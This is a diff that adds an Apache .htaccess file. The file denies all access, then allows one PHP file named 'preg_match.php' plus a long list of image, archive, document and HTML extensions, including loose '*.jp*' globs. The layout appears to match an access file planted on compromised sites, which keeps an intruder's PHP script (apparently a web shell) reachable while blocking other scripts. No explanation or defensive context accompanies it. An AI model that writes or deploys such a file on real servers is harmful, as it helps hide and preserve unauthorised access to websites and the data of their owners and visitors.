@@ -1,0 +1,101 @@
+Deny from All
+<Files preg_match.php>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.jp*>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.jP*>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.Jp*>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.JP*>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.gif>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.GIF>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.pdf>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.PDF>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.zip>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.rar>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.tar>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.tar.gz>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.tar.xz>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.txt>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.apk>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.xls>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.xlsx>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.csv>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.png>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.PNG>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.ico>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.ICO>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.html>
+Order Allow,Deny
+Allow from All
+</Files>
+<Files *.xml>
+Order Allow,Deny
+Allow from All
+</Files>
